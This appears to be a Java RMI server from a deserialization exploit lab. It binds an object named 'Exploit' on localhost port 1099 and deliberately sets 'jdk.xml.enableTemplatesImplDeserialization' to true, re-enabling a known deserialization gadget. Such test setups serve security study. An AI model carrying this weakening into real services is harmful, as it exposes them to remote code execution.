import java.io.Serializable;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {
    private void start() throws Exception {
        if (null == System.getSecurityManager()) {
            System.out.println("Setup SecurityManager...");
            SecurityManager sm = new SecurityManager();
            System.setSecurityManager(sm);
            System.out.println(sm);

            System.setProperty("jdk.xml.enableTemplatesImplDeserialization", "true");   
        }

        CalcImpl bindClass = new CalcImpl();
        LocateRegistry.createRegistry(1099);
        Naming.bind("rmi://127.0.0.1:1099/Exploit", bindClass);
        System.out.println(" rmi server is ready, bind name Exploit ...");
    }

    public static void main(String[] args) throws Exception {
        new RMIServer().start();
    }
}
